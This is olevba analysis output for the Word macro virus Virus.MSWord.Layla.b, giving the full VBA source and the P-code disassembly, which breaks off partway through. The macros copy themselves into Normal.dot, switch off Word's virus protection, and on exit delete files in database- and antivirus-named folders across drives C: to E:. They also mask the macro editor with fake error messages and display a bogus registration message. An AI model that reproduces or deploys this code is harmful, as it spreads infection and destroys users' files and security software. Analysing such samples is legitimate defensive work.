olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Layla.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Layla.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MaCROSOFT.bas 
in file: Virus.MSWord.Layla.b - OLE stream: 'Macros/VBA/MaCROSOFT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
 Call GlobalMission
On Error Resume Next
 Call MaCROSOFT
End Sub
Sub MaCROSOFT()
'Tj's Lab. presents... Hi from Samara !
Application.DisplayAlerts = wdAlertsNone
Application.ScreenUpdating = False
On Error Resume Next
With Options
    .VirusProtection = False
    .SaveNormalPrompt = False
End With

On Error Resume Next
With Application
     .UserName = "Patient Of Dr.OGen"
     .UserInitials = ""
     .UserAddress = ""
End With
ActiveDocument.ReadOnlyRecommended = False
KTO_ = 0
If MacroContainer = NormalTemplate Then KTO_ = 1
If KTO_ = 1 Then KTO = NormalTemplate.FullName Else KTO = ActiveDocument.FullName
If KTO_ = 1 Then KOGO = ActiveDocument.FullName Else KOGO = NormalTemplate.FullName
Application.OrganizerCopy Source:=KTO, Destination:=KOGO, Name:="MaCROSOFT", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=KTO, Destination:=KOGO, Name:="AboutFrm", Object:=wdOrganizerObjectProjectItems
If KTO_ = 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If KTO_ = 0 Then
     If NormalTemplate.Saved = False Then NormalTemplate.Save
     End If
End Sub
Sub AutoExec()
Application.DisplayAlerts = wdAlertsNone
Application.ScreenUpdating = False
On Error Resume Next
If Day(Now()) = 29 Or Day(Now()) = 3 _
Then Application.Caption = "Macrosoft Word" _
Else Application.Caption = ""
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
On Error Resume Next
With Application
     .UserName = "Patient Of Dr.OGen"
     .UserInitials = ""
     .UserAddress = ""
End With
End Sub
Sub AutoExit()
On Error Resume Next
Application.OrganizerDelete Source:=NormalTemplate.FullName, _
           Name:="TJ", Object:=wdOrganizerObjectProjectItems
If NormalTemplate.Saved = False Then NormalTemplate.Save
Dim i
Application.Visible = False
Path = "c:\"
Search:
DirName = Dir(Path, vbDirectory)
Do While DirName <> ""
    If DirName <> "." And DirName <> ".." Then
        If (GetAttr(Path & DirName) And vbDirectory) = vbDirectory _
        Then
          With Application.FileSearch
               .FileName = "*d*r*w*.*d*b*"
               .LookIn = Path & DirName
               .Execute
          For i = 1 To .FoundFiles.Count
           On Error Resume Next
           Kill Path & DirName & "\*.*"
           Next i
          End With
          With Application.FileSearch
               .FileName = "*a*v*p*.*"
               .LookIn = Path & DirName
               .Execute
          For i = 1 To .FoundFiles.Count
           On Error Resume Next
           Kill Path & DirName & "\*.av*"
           On Error Resume Next
           Kill Path & DirName & "\*.key"
           Next i
          End With
        End If
    End If
    DirName = Dir
Loop

Select Case Path
Case "c:\"
    Path = "c:\program files\"
    GoTo Search
Case "c:\program files\"
    Path = "d:\"
    GoTo Search
Case "d:\"
    Path = "e:\"
    GoTo Search
Case "e:\"
    GoTo Konets
End Select

Konets:
End Sub
Sub AutoClose()
On Error Resume Next
 Call FileClose
End Sub
Sub FileClose()
If (Format(Now, "dd") = 29) And (Format(Now, "ss") = 29) Then GoTo Nehorosho Else GoTo Profilaktika
Nehorosho:
    Selection.WholeStory
    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.Font.ColorIndex = wdBlack
    Selection.TypeText Text:="Âû ÿâëÿåòåñü íåçàðåãèñòðèðîâàííûì ïîëüçîâàòåëåì ïðîäóêòà"
    Selection.TypeParagraph
    Selection.Font.ColorIndex = wdRed
    Selection.TypeText Text:="Dr.OGen v.1.1"
    Selection.TypeParagraph
    Selection.Font.ColorIndex = wdBlack
    Selection.TypeText Text:="Âû ìîæåòå âûñëàòü çàïðîñ íà ðåãèñòðàöèþ â ïðîèçâîëüíîé ôîðìå ïî EMail:"
    Selection.TypeParagraph
    Selection.Font.ColorIndex = wdBlue
    Selection.TypeText Text:="ogen@mail.ru"
    Selection.MoveLeft Unit:=wdCharacter, Count:=12, Extend:=wdExtend
    ActiveDocument.Hyperlinks.Add Anchor:=Selection.Range, Address:= _
        "mailto:ogen@mail.ru", SubAddress:=""
    Selection.Font.ColorIndex = wdBlack
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "Òàêæå ïðèíèìàþòñÿ îòçûâû è ïðåäëîæåíèÿ ïî ðàáîòå ïðîãðàììû."
    Selection.WholeStory
    Selection.LanguageID = wdNoProofing
    Selection.Font.Name = "Arial"
    Selection.Font.Size = 12
    Selection.MoveRight Unit:=wdCharacter, Count:=1
    Selection.TypeParagraph
    Selection.Font.ColorIndex = wdBlack
Profilaktika:
 On Error Resume Next
 Call MaCROSOFT
 ActiveDocument.Close
End Sub
Sub FileOpen()
Dialogs(wdDialogFileOpen).Show
On Error Resume Next
 Call GlobalMission
On Error Resume Next
 Call MaCROSOFT
Application.DisplayAlerts = wdAlertsNone
Application.ScreenUpdating = False
ActiveDocument.Save
End Sub
Sub ToolsMacro()
    Dim MB
    On Error Resume Next
    MB = MsgBox("Can't find necessary library VBOGen.DLL", 16, "Microsoft Word Error")
End Sub
Sub ToolsCustomize()
End Sub
Sub FileTemplates()
End Sub
Sub ViewVBCode()
    Dim MB
    On Error Resume Next
    MB = MsgBox("The program has executed invalid operation and will be closed", 16, "FATAL ERROR")
    Application.Quit SaveChanges:=wdDoNotSaveChanges
End Sub
Sub HelpAbout()
    On Error Resume Next
    AboutFrm.Show
End Sub
Sub GlobalMission()
Dim Location
Location = 0
If MacroContainer = NormalTemplate Then Location = 1
If Location = 1 Then PATIENT = ActiveDocument.FullName Else PATIENT = NormalTemplate.FullName

On Error Resume Next
Application.OrganizerDelete Source:=PATIENT, _
           Name:="TJ", Object:=wdOrganizerObjectProjectItems
On Error Resume Next
Application.OrganizerDelete Source:=PATIENT, _
           Name:="NewMacros", Object:=wdOrganizerObjectProjectItems
On Error Resume Next
Application.OrganizerDelete Source:=PATIENT, _
           Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
On Error Resume Next
Application.OrganizerDelete Source:=PATIENT, _
           Name:="AutoClose", Object:=wdOrganizerObjectProjectItems
On Error Resume Next
Application.OrganizerDelete Source:=PATIENT, _
           Name:="AutoExit", Object:=wdOrganizerObjectProjectItems
On Error Resume Next
Application.OrganizerDelete Source:=PATIENT, _
           Name:="FileOpen", Object:=wdOrganizerObjectProjectItems
On Error Resume Next
Application.OrganizerDelete Source:=PATIENT, _
           Name:="FileClose", Object:=wdOrganizerObjectProjectItems
On Error Resume Next
Application.OrganizerDelete Source:=PATIENT, _
           Name:="FileSave", Object:=wdOrganizerObjectProjectItems
On Error Resume Next
Application.OrganizerDelete Source:=PATIENT, _
           Name:="ToolsMacro", Object:=wdOrganizerObjectProjectItems
On Error Resume Next
Application.OrganizerDelete Source:=PATIENT, _
           Name:="ToolsCustomize", Object:=wdOrganizerObjectProjectItems
On Error Resume Next
Application.OrganizerDelete Source:=PATIENT, _
           Name:="FileTemplates", Object:=wdOrganizerObjectProjectItems
On Error Resume Next
Application.OrganizerDelete Source:=PATIENT, _
           Name:="ViewVBCode", Object:=wdOrganizerObjectProjectItems
End Sub
-------------------------------------------------------------------------------
VBA MACRO AboutFrm.frm 
in file: Virus.MSWord.Layla.b - OLE stream: 'Macros/VBA/AboutFrm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Layla.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/MaCROSOFT - 11023 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	ArgsCall (Call) GlobalMission 0x0000 
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall (Call) MaCROSOFT 0x0000 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Sub MaCROSOFT())
' Line #7:
' 	QuoteRem 0x0000 0x0026 "Tj's Lab. presents... Hi from Samara !"
' Line #8:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #10:
' 	OnError (Resume Next) 
' Line #11:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #12:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #13:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #14:
' 	EndWith 
' Line #15:
' Line #16:
' 	OnError (Resume Next) 
' Line #17:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #18:
' 	LitStr 0x0012 "Patient Of Dr.OGen"
' 	MemStWith UserName 
' Line #19:
' 	LitStr 0x0000 ""
' 	MemStWith UserInitials 
' Line #20:
' 	LitStr 0x0000 ""
' 	MemStWith UserAddress 
' Line #21:
' 	EndWith 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #23:
' 	LitDI2 0x0000 
' 	St KTO_ 
' Line #24:
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St KTO_ 
' 	EndIf 
' Line #25:
' 	Ld KTO_ 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St KTO 
' 	Else 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St KTO 
' 	EndIf 
' Line #26:
' 	Ld KTO_ 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St KOGO 
' 	Else 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St KOGO 
' 	EndIf 
' Line #27:
' 	Ld KTO 
' 	ParamNamed Source 
' 	Ld KOGO 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "MaCROSOFT"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #28:
' 	Ld KTO 
' 	ParamNamed Source 
' 	Ld KOGO 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "AboutFrm"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #29:
' 	Ld KTO_ 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #30:
' 	Ld KTO_ 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #31:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	EndSub 
' Line #34:
' 	FuncDefn (Sub AutoExec())
' Line #35:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #36:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	LineCont 0x0008 12 00 00 00 18 00 00 00
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001D 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000E "Macrosoft Word"
' 	Ld Application 
' 	MemSt Caption 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt Caption 
' 	EndIf 
' Line #39:
' 	OnError (Resume Next) 
' Line #40:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #41:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #42:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #43:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #44:
' 	EndWith 
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #47:
' 	LitStr 0x0012 "Patient Of Dr.OGen"
' 	MemStWith UserName 
' Line #48:
' 	LitStr 0x0000 ""
' 	MemStWith UserInitials 
' Line #49:
' 	LitStr 0x0000 ""
' 	MemStWith UserAddress 
' Line #50:
' 	EndWith 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub AutoExit())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	LineCont 0x0004 09 00 0B 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0002 "TJ"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #55:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #56:
' 	Dim 
' 	VarDefn i
' Line #57:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Visible 
' Line #58:
' 	LitStr 0x0003 "c:\"
' 	St Path 
' Line #59:
' 	Label Search 
' Line #60:
' 	Ld Path 
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	St DirName 
' Line #61:
' 	Ld DirName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #62:
' 	Ld DirName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Ld DirName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	And 
' 	IfBlock 
' Line #63:
' 	LineCont 0x0004 0D 00 08 00
' 	Ld Path 
' 	Ld DirName 
' 	Concat 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbDirectory 
' 	And 
' 	Paren 
' 	Ld vbDirectory 
' 	Eq 
' 	IfBlock 
' Line #64:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #65:
' 	LitStr 0x000D "*d*r*w*.*d*b*"
' 	MemStWith FileName 
' Line #66:
' 	Ld Path 
' 	Ld DirName 
' 	Concat 
' 	MemStWith LookIn 
' Line #67:
' 	ArgsMemCallWith Execute 0x0000 
' Line #68:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #69:
' 	OnError (Resume Next) 
' Line #70:
' 	Ld Path 
' 	Ld DirName 
' 	Concat 
' 	LitStr 0x0004 "\*.*"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #71:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #72:
' 	EndWith 
' Line #73:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #74:
' 	LitStr 0x0009 "*a*v*p*.*"
' 	MemStWith FileName 
' Line #75:
' 	Ld Path 
' 	Ld DirName 
' 	Concat 
' 	MemStWith LookIn 
' Line #76:
' 	ArgsMemCallWith Execute 0x0000 
' Line #77:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #78:
' 	OnError (Resume Next) 
' Line #79:
' 	Ld Path 
' 	Ld DirName 
' 	Concat 
' 	LitStr 0x0006 "\*.av*"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #80:
' 	OnError (Resume Next) 
' Line #81:
' 	Ld Path 
' 	Ld DirName 
' 	Concat 
' 	LitStr 0x0006 "\*.key"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #82:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #83:
' 	EndWith 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	EndIfBlock 
' Line #86:
' 	Ld Dir 
' 	St DirName 
' Line #87:
' 	Loop 
' Line #88:
' Line #89:
' 	Ld Path 
' 	SelectCase 
' Line #90:
' 	LitStr 0x0003 "c:\"
' 	Case 
' 	CaseDone 
' Line #91:
' 	LitStr 0x0011 "c:\program files\"
' 	St Path 
' Line #92:
' 	GoTo Search 
' Line #93:
' 	LitStr 0x0011 "c:\program files\"
' 	Case 
' 	CaseDone 
' Line #94:
' 	LitStr 0x0003 "d:\"
' 	St Path 
' Line #95:
' 	GoTo Search 
' Line #96:
' 	LitStr 0x0003 "d:\"
' 	Case 
' 	CaseDone 
' Line #97:
' 	LitStr 0x0003 "e:\"
' 	St Path 
' Line #98:
' 	GoTo Search 
' Line #99:
' 	LitStr 0x0003 "e:\"
' 	Case 
' 	CaseDone 
' Line #100:
' 	GoTo Konets 
' Line #101:
' 	EndSelect 
' Line #102:
' Line #103:
' 	Label Konets 
' Line #104:
' 	EndSub 
' Line #105:
' 	FuncDefn (Sub AutoClose())
' Line #106:
' 	OnError (Resume Next) 
' Line #107:
' 	ArgsCall (Call) FileClose 0x0000 
' Line #108:
' 	EndSub 
' Line #109:
' 	FuncDefn (Sub FileClose())
' Line #110:
' 	Ld Now 
' 	LitStr 0x0002 "dd"
' 	ArgsLd Format$ 0x0002 
' 	LitDI2 0x001D 
' 	Eq 
' 	Paren 
' 	Ld Now 
' 	LitStr 0x0002 "ss"
' 	ArgsLd Format$ 0x0002 
' 	LitDI2 0x001D 
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo Nehorosho 
' 	Else 
' 	BoSImplicit 
' 	GoTo Profilaktika 
' 	EndIf 
' Line #111:
' 	Label Nehorosho 
' Line #112:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #113:
' 	Ld wdAlignParagraphCenter 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #114:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #115:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #116:
' 	Ld wdBlack 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #117:
' 	LitStr 0x0038 "Âû ÿâëÿåòåñü íåçàðåãèñòðèðîâàííûì ïîëüçîâàòåëåì ïðîäóêòà"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #118:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #119:
' 	Ld wdRed 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #120:
' 	LitStr 0x000D "Dr.OGen v.1.1"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #121:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #122:
' 	Ld wdBlack 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #123:
' 	LitStr 0x0046 "Âû ìîæåòå âûñëàòü çàïðîñ íà ðåãèñòðàöèþ â ïðîèçâîëüíîé ôîðìå ïî EMail:"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #124:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #125:
' 	Ld wdBlue 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #126:
' 	LitStr 0x000C "ogen@mail.ru"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #127:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x000C 
' 	ParamNamed Count 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall MoveLeft 0x0003 
' Line #128:
' 	LineCont 0x0004 0D 00 08 00
' 	Ld Selection 
' 	MemLd Range 
' 	ParamNamed Anchor 
' 	LitStr 0x0013 "mailto:ogen@mail.ru"
' 	ParamNamed Address 
' 	LitStr 0x0000 ""
' 	ParamNamed SubAddress 
' 	Ld ActiveDocument 
' 	MemLd Hyperlinks 
' 	ArgsMemCall Add 0x0003 
' Line #129:
' 	Ld wdBlack 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #130:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #131:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #132:
' 	LineCont 0x0004 05 00 08 00
' 	LitStr 0x003B "Òàêæå ïðèíèìàþòñÿ îòçûâû è ïðåäëîæåíèÿ ïî ðàáîòå ïðîãðàììû."
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #133:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #134:
' 	Ld wdNoProofing 
' 	Ld Selection 
' 	MemSt LanguageID 
' Line #135:
' 	LitStr 0x0005 "Arial"
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt New 
' Line #136:
' 	LitDI2 0x000C 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #137:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveRight 0x0002 
' Line #138:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #139:
' 	Ld wdBlack 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #140:
' 	Label Profilaktika 
' Line #141:
' 	OnError (Resume Next) 
' Line #142:
' 	ArgsCall (Call) MaCROSOFT 0x0000 
' Line #143:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #144:
' 	EndSub 
' Line #145:
' 	FuncDefn (Sub FileOpen())
' Line #146:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #147:
' 	OnError (Resume Next) 
' Line #148:
' 	ArgsCall (Call) GlobalMission 0x0000 
' Line #149:
' 	OnError (Resume Next) 
' Line #150:
' 	ArgsCall (Call) MaCROSOFT 0x0000 
' Line #151:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #152:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #153:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #154:
' 	EndSub 
' Line #155:
' 	FuncDefn (Sub ToolsMacro())
' Line #156:
' 	Dim 
' 	VarDefn MB
' Line #157:
' 	OnError (Resume Next) 
' Line #158:
' 	LitStr 0x0027 "Can't find necessary library VBOGen.DLL"
' 	LitDI2 0x0010 
' 	LitStr 0x0014 "Microsoft Word Error"
' 	ArgsLd MsgBox 0x0003 
' 	St MB 
' Line #159:
' 	EndSub 
' Line #160:
' 	FuncDefn (Sub ToolsCustomize())
' Line #161:
' 	EndSub 
' Line #162:
' 	FuncDefn (Sub FileTemplates())
' Line #163:
' 	EndSub 
' Line #164:
' 	FuncDefn (Sub ViewVBCode())
' Line #165:
' 	Dim 
' 	VarDefn MB
' Line #166:
' 	OnError (Resume Next) 
' Line #167:
' 	LitStr 0x003D "The program has executed invalid operation and will be closed"
' 	LitDI2 0x0010 
' 	LitStr 0x000B "FATAL ERROR"
' 	ArgsLd MsgBox 0x0003 
' 	St MB 
' Line #168:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld Application 
' 	ArgsMemCall Quit 0x0001 
' Line #169:
' 	EndSub 
' Line #170:
' 	FuncDefn (Sub HelpAbout())
' Line #171:
' 	OnError (Resume Next) 
' Line #172:
' 	Ld AboutFrm 
' 	ArgsMemCall Show 0x0000 
' Line #173:
' 	EndSub 
' Line #174:
' 	FuncDefn (Sub GlobalMission())
' Line #175:
' 	Dim 
' 	VarDefn Location
' Line #176:
' 	LitDI2 0x0000 
' 	St Location 
' Line #177:
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Location 
' 	EndIf 
' Line #178:
' 	Ld Location 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St PATIENT 
' 	Else 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St PATIENT 
' 	EndIf 
' Line #179:
' Line #180:
' 	OnError (Resume Next) 
' Line #181:
' 	LineCont 0x0004 07 00 0B 00
' 	Ld PATIENT 
' 	ParamNamed Source 
' 	LitStr 0x0002 "TJ"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #182:
' 	OnError (Resume Next) 
' Line #183:
' 	LineCont 0x0004 07 00 0B 00
' 	Ld PATIENT 
' 	ParamNamed Source 
' 	LitStr 0x0009 "NewMacros"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #184:
' 	OnError (Resume Next) 
' Line #185:
' 	LineCont 0x0004 07 00 0B 00
' 	Ld PATIENT 
' 	ParamNamed Source 
' 	LitStr 0x0008 "AutoOpen"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #186:
' 	OnError (Resume Next) 
' Line #187:
' 	LineCont 0x0004 07 00 0B 00
' 	Ld PATIENT 
' 	ParamNamed Source 
' 	LitStr 0x0009 "AutoClose"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #188:
' 	OnError (Resume Next) 
' Line #189:
' 	LineCont 0x0004 07 00 0B 00
' 	Ld PATIENT 
' 	ParamNamed Source 
' 	LitStr 0x0008 "AutoExit"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #190:
' 	OnError (Resume Next) 
' Line #191:
' 	LineCont 0x0004 07 00 0B 00
' 	Ld PATIENT 
' 	ParamNamed Source 
' 	LitStr 0x0008 "FileOpen"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #192:
' 	OnError (Resume Next) 
' Line #193:
' 	LineCont 0x0004 07 00 0B 00
' 	Ld PATIENT 
' 	ParamNamed Source 
' 	LitStr 0x0009 "FileClose"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #194:
' 	OnError (Resume Next) 
' Line #195:
' 	LineCont 0x0004 07 00 0B 00
' 	Ld PATIENT 
' 	ParamNamed Source 
' 	LitStr 0x0008 "FileSave"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #196:
' 	OnError (Resume Next) 
' Line #197:
' 	LineCont 0x0004 07 00 0B 00
' 	Ld PATIENT 
' 	ParamNamed Source 
' 	LitStr 0x000A "ToolsMacro"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #198:
' 	OnError (Resume Next) 
' Line #199:
' 	LineCont 0x0004 07 00 0B 00
' 	Ld PATIENT 
' 	ParamNamed Source 
' 	LitStr 0x000E "ToolsCustomize"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #200:
' 	OnError (Resume Next) 
' Line #201:
' 	LineCont 0x0004 07 00 0B 00
